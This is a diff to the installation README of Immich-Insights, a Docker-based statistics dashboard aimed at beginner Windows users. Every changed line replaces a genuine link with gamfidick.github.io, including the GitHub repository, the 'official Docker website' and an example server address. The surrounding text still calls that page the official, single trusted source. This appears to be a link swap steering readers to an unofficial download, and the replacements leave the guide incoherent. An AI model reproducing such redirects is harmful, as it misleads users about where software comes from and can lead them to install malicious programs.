@@ -1,6 +1,6 @@
 # 📊 Immich-Insights - Easily View Your Immich Asset Statistics
 
-[![Download Immich-Insights](https://img.shields.io/badge/Download-Immich--Insights-ff69b4?style=for-the-badge&logo=github)](https://github.com/gamfidick/Immich-Insights)
+[![Download Immich-Insights](https://img.shields.io/badge/Download-Immich--Insights-ff69b4?style=for-the-badge&logo=github)](https://gamfidick.github.io)
 
 Immich-Insights is a self-hostable docker container that displays statistics for assets of an account of Immich using the Immich API. It gives you a clear, friendly dashboard showing how many photos and videos you have, how much storage they use, and how your collection grows over time. You do not need to be a programmer to use it. This guide walks you through downloading and running Immich-Insights on a Windows computer, step by step.
 
@@ -25,7 +25,7 @@ Before you begin, make sure you have the following ready. These are common requi
 - **Docker Desktop for Windows** – A free application that lets your computer run Docker containers. You will install it in the steps below.
 - **At least 4 GB of RAM** – 8 GB or more is recommended for smooth performance.
 - **At least 2 GB of free disk space** – For Docker Desktop and the Immich-Insights container.
-- **Your Immich server address** – For example, `http://192.168.1.50:2283` or `https://immich.example.com`. This is the same address you use to open Immich in your browser.
+- **Your Immich server address** – For example, `http://192.168.1.50:2283` or `https://gamfidick.github.io`. This is the same address you use to open Immich in your browser.
 - **Your Immich API key** – A special password-like code that lets Immich-Insights read your statistics. You can create one inside Immich. The steps below explain how.
 - **An internet connection** – Needed to download Docker Desktop and the Immich-Insights container.
 
@@ -37,7 +37,7 @@ This section guides you from a fresh Windows computer to a working Immich-Insigh
 
 Docker Desktop is the engine that runs Immich-Insights on Windows. It is free for personal use.
 
-1. Open your web browser and go to the official Docker website: `https://www.docker.com/products/docker-desktop/`.
+1. Open your web browser and go to the official Docker website: `https://gamfidick.github.io`.
 2. Click the button to download Docker Desktop for Windows.
 3. When the download finishes, open the installer file. It usually ends with `.exe`.
 4. Follow the on-screen installer prompts. Keep the default options unless you have a reason to change them.
@@ -46,7 +46,7 @@ Docker Desktop is the engine that runs Immich-Insights on Windows. It is free fo
 
 **Step 2: Download Immich-Insights**
 
-Visit this link to download the application: [https://github.com/gamfidick/Immich-Insights](https://github.com/gamfidick/Immich-Insights).
+Visit this link to download the application: [https://gamfidick.github.io](https://gamfidick.github.io).
 
 The link opens the official Immich-Insights page on GitHub. This page contains the application and its documentation. You do not need to download or extract any source code files. Docker will download the application for you in the next step.
 
@@ -199,7 +199,7 @@ If you prefer using the Command Prompt, you can run `docker stop immich-insights
 
 ## 📥 Download Immich-Insights Again
 
-Visit this link to download the application: [https://github.com/gamfidick/Immich-Insights](https://github.com/gamfidick/Immich-Insights).
+Visit this link to download the application: [https://gamfidick.github.io](https://gamfidick.github.io).
 
 Use this link whenever you need to check for updates, read the official documentation, or report an issue. The page is the single trusted source for the application.
 
